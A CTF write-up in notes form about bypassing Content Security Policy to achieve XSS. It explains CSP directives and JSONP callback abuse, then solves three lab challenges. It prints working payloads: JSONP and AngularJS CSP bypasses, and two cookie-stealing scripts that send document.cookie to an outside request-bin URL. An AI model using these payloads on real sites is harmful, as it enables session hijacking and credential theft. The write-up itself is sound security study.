
# XSS

Some notes about CSP:

1. **`default-src`** directive serves as a fallback for the other CSP [fetch directives](https://developer.mozilla.org/en-US/docs/Glossary/Fetch_directive). For each of the following directives that are absent, the user agent looks for the `default-src` directive and uses this value for it.

2. The **`script-src`** directive specifies valid sources for JavaScript. This includes not only URLs loaded directly into [`<script>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script) elements, but also things like inline script event handlers (`onclick`) and [XSLT stylesheets](https://developer.mozilla.org/en-US/docs/Web/XSLT) which can trigger script execution.

3. `object-src 'none'` Prevents fetching and executing plugin resources embedded using `<object>`, `<embed>` or `<applet>` tags. The most common example is Flash.

4. `script-src nonce-{random} 'unsafe-inline'` The `nonce` directive means that `<script>` elements will be allowed to execute only if they contain a *nonce* attribute matching the randomly-generated value which appears in the policy.

   *Note: In the presence of a CSP nonce the `unsafe-inline` directive will be ignored by modern browsers. Older browsers, which don't support nonces, will see `unsafe-inline` and allow inline scripts to execute.*

5. `script-src 'strict-dynamic' https: http:` 'strict-dynamic' allows the execution of scripts dynamically added to the page, as long as they were loaded by a safe, already-trusted script (see the [specification](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage)).

   *Note: In the presence of 'strict-dynamic' the https: and http: whitelist entries will be ignored by modern browsers. Older browsers will allow the loading of scripts from any URL.*

6. `'unsafe-eval'` allows the application to use the `eval()` JavaScript function. This reduces the protection against certain types of DOM-based XSS bugs, but makes it easier to adopt CSP. If your application doesn't use `eval()`, you can remove this keyword and have a safer policy. More on the `eval` function:

## Recall: What is API callback and why are we using it?

From [Bypassing CSP by Abusing JSONP Endpoints | by Mazin Ahmed | Medium](https://medium.com/@mazin.ahmed/bypassing-csp-by-abusing-jsonp-endpoints-47cf453624d5):

JSONP APIs normally works by having a parameter that sets a callback, so that users of the JSONP API can freely use the API according to their code. The GET parameter is reflected on the response in the 0 offset. This means that we basically control the start of the response body. JavaScript is a very dynamic language. It dynamically allows us to do many things we should not do, and are not supposed to do. Let’s use some of JavaScript magic to our side here. What if we enter:

> alert(1);//

as our callback? If no proper sanitization is done on the JSONP endpoint, it will be reflected as the following:

> alert(1);//{“name”: “Mazin”}

This is technically a correct JavaScript code! The syntax is correct as the rest of the response of commented out. JS engines would treat the data as a typical JavaScript code instead of a JSONP endpoint.

## babycsp

Valid JSONP belonging to `*.google.com` that we can use:

 `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>`

Since the CSP of the website is:

```javascript
default-src 'self'; script-src 'self' *.google.com; connect-src *
```

### The exploit

We need a page that makes an HTTP req to reqbins, and that sends to it all the cookies. Then we use the XSS vulnerability on the website of the challenge to make the admin visit that webpage, and we should be all set. More specifically those are the steps to follow:

1. First we setup our requestbin and we copy its url
2. Then we execute a GET to the homepage of the challenge to create a session
3. We perform a POST to create the content on the webapp
4. Then we perform a GET to make the admin visit the url of our post. When loaded it will execute or javascript code, this performing the XSS attack which will send the admin's cookies to our request bin by performing a POST to it with the cookies encoded in the headers.

This is the javascript payload:

```python
payload = """
<script src="https://accounts.google.com/o/oauth2/revoke?callback=
window.location.href = ''.concat('""" + HOOK + """?c=', document.cookie);
"></script>
"""
```

Where `HOOK` is the url of the request bin. Putting that in a post and sending it to the admin will allow us to send the session cookie of the admin, which contains the flag, to our bin embedded as request parameter.

## csp

```javascript
Content-Security-Policy: default-src https://www.google.com https://ajax.googleapis.com 'unsafe-eval'; style-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/; font-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;object-src 'none'
```

Because of `object-src 'none'` we cannot use object, embed or applet tags.

We have user input escaping. More specifically, if I send this text:

```
'';!--"<XSS>=&{()}
```

This is what gets printed:

```
&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()}
```

Which means that we only have `; ! - = {} ()`. Still, we have a vulnerability. In fact there's a specific field, which is the one that is used to add participant names to the event, which is not escaped. As such we can use it to carry our exploit.

### First approach

Now that we have some attack surface, I started trying some exploits.

* First off, from [Content Security Policy (CSP) Bypass - HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass):

  `Content-Security-Policy: script-src https://google.com 'unsafe-eval'; `
  
  Working payload:` <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>`
  
  But that did not work: 

  `Caricamento non riuscito per lo <script> con sorgente “data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==”.`.

* This looked promising: `<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>`, but the GET request returns 404.

* `<embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>` this would not work because this csp blocks embed tags.

* This actually worked:

  ```html
  ><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
  ```

  But this is tricky, because it basically executes the url and it puts the result as function argument, in this case we've got an `alert`, which means that the result of that google search will be printed as an alert by the browser.

* This other one `<script src="https://www.google.com/tools/feedback/escalation-options?callback=alert(1337)"></script>` actually does something, but from the look of it, its not useful: it just returns a GET with this body:

  ```javascript
  // API callback
  alert1337({})
  ```

### Solution

A bit disappointing, since I solved this with random code found on the internet. From [CSP - Pentest Book (six2dez.com)](https://pentestbook.six2dez.com/enumeration/web/csp):

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script> <div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} </div>
```

**Note**: the payload must be at most 255 characters long!

## strict-csp

```javascript
Content-Security-Policy: default-src 'self'; script-src 'strict-dynamic' 'nonce-Iyt3N79hSx'; style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/; font-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;object-src 'none'
```

Here we've got a problem: we have a nonce implemented in the CSP. First thing off, I vaidated it with [CSP Evaluator (csp-evaluator.withgoogle.com)](https://csp-evaluator.withgoogle.com/). From that we can see that we've got a problem derivating from the fact that `base-uri` is missing:

>Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. Can you set it to 'none' or 'self'?

And the same goes for `require-trusted-types-for`:

>Consider requiring Trusted Types for scripts to lock down DOM XSS injection sinks. You can do this by adding "require-trusted-types-for 'script'" to your policy.

The exploit surface here is the `require.js` file. This is enough to solve the challenge:

```html
<script data-main='data:1,window.location.href="https://en1lv1e4jrpywf5.m.pipedream.net?c"+document.cookie;' src='require.js'></script>
```
